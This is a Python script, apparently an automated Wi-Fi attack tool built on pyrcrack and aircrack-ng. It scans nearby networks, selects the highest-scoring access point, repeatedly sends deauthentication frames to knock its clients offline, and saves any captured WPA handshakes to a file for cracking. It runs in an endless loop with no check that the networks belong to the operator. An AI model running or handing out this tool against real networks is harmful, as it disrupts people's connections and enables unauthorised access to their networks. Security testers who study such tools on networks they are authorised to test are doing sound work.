#!/usr/bin/env python3

import asyncio
import pyrcrack
import subprocess
from os import listdir

ldb = {}
IFACE="wlan2"
CHECKED=0

async def check_pcap(cap_file, bssid):
    p = subprocess.Popen(['aircrack-ng', cap_file], stdout=subprocess.PIPE)
    out, err = p.communicate()
    if '1 handshake' in out.decode() or '2 handshake' in out.decode():
        with open(cap_file, 'rb') as f:
            with open('%s_handshake.cap' %bssid, 'ab+') as f2:
                f2.write(f.read())
        return True
    return False

async def deauth_client(AP, pdump, c_bssid):
    print('Deauthing %s on %s' %(c_bssid, AP['bssid']))
    airmon = pyrcrack.AirmonNg()
    async with airmon(IFACE, AP['channel']):
        async with pyrcrack.AireplayNg() as aireplay:
            async for res in aireplay(IFACE, deauth=10, D=True, a=AP['bssid'], c=c_bssid):
                print('Res in aireplay', res)
                await asyncio.sleep(3)
                continue

async def deauth_clients(AP, pdump):
    print('Deauthing all clients on %s' %AP['bssid'])
    airmon = pyrcrack.AirmonNg()
    async with airmon(IFACE, AP['channel']):
        async with pyrcrack.AireplayNg() as aireplay:
            async for res in aireplay(IFACE, deauth=10, D=True, b=AP['bssid']):
                print('Res in aireplay deauth_clients', res)
                await asyncio.sleep(3)
                continue

def print_AP(AP):
    print("ESSID: %s - (%s) - Score: %s - Channel: %s - Enc: %s - Packets: %s - Clients : %s" %(AP['essid'], AP['bssid'], AP['score'], AP['channel'], AP['encryption'], AP['packets'], AP['clients']))

def get_best_ap(ldb):
    best_ap = None
    for bssid in ldb.keys():
        if not best_ap or best_ap['score'] < ldb[bssid]['score']:
            best_ap = ldb[bssid]
    return best_ap

async def scan_single(AP, max_tries=3):
    tries = 0
    waited = 0
    print('Scanning single AP', AP)
    async with pyrcrack.AirodumpNg() as pdump:
        async for result in pdump(IFACE, channel=AP['channel'], bssid=AP['bssid']):
            for ap in result:
                print('AP', ap)
                print('AP dict', ap.asdict())

                for client in ap.clients:
                    print('Client data :')
                    print(client.data.toDict())
                    print(client.bssid)
                    print('Client data done')
                    if client.bssid:
                        if waited == 0 or waited > 20:
                            print('Got a bssid, deauthing client', waited)
                            await deauth_client(ap, pdump, client.bssid)
                            print('Done deauthing')
                            waited = 1
                            tries += 1
                            if tries >= max_tries:
                                return False
                        else:
                            print('Incrementing waited', waited)
                            waited += 1
                            await asyncio.sleep(1)
                    else:
                        print('No clients')
                pwned = await check_pcap(pdump.get_file('cap'), AP['bssid'])
                if pwned:
                    return True
            await asyncio.sleep(3)

async def scan(wait=10):
    selected_ap = None
    waited = 0
    async with pyrcrack.AirodumpNg() as pdump:
        async for result in pdump(IFACE):
            for AP in result:
                d = AP.asdict()
                d.update(dict(clients=len(AP.clients)))
                if not ldb.get(AP.bssid):
                    ldb[AP.bssid] = d
                    ldb[AP.bssid]['handshake'] = None
                else:
                    ldb[AP.bssid] = d
            best_ap = get_best_ap(ldb)
            print('Best AP so far', best_ap)
            if best_ap and int(best_ap['score']) > 50 and waited >= wait:
                print('Got a good candidate')
                print(AP.asdict())
                selected_ap = AP.asdict()
                break
            else:
                print(ldb)
                print(AP.essid)
                print(AP.bssid)
            await asyncio.sleep(2)
            waited += 1
            print('WAITED', waited)
    if selected_ap:
        pwned = await scan_single(selected_ap)
        print('pwned is', pwned)
        ldb[AP.bssid]['pwned'] = pwned
        print('LDB dump', ldb)

def main():
    while True:
        asyncio.run(scan())
    return 0

if __name__ == "__main__":
    exit(main())